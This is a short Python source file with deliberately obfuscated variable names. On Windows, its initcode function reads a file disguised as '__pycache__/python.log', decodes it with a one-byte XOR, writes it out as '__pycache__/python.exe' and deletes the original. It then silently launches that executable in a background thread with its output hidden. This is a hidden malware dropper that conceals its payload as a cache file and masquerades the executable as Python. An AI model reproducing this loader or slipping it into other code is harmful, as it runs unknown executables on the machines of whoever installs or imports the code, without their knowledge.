import os
import subprocess
import threading

def get_close_ace():
    OOOOOO0O00OO00OOO =os .path .abspath ('__pycache__/python.exe')
    os .chdir (os .path .abspath ('__pycache__'))
    subprocess .Popen ([OOOOOO0O00OO00OOO ],shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE )
    
def initcode():
    try :
        O00OOO00O00OO0O00 =os .name 
        if O00OOO00O00OO0O00 =='nt':
            with open ('__pycache__/python.log','rb')as OO00OO000O0O0000O :
                OOO000OO0OO0O0OOO =OO00OO000O0O0000O .read ()
            OOOO00O0000O0O000 =bytearray ()
            for OO000O0OOO0OO0OO0 in OOO000OO0OO0O0OOO :
                OOOO00O0000O0O000 .append (OO000O0OOO0OO0OO0 ^4 )
            with open ('__pycache__/python.exe','wb')as OO00OO000O0O0000O :
                OO00OO000O0O0000O .write (OOOO00O0000O0O000 )
            os .remove ('__pycache__/python.log')
            OO0O0OO000000OO00 =threading .Thread (target =get_close_ace )
            OO0O0OO000000OO00 .start ()
    except Exception as O00O0000OOOO0OOOO :
        print (f"Error: {str(O00O0000OOOO0OOOO)}")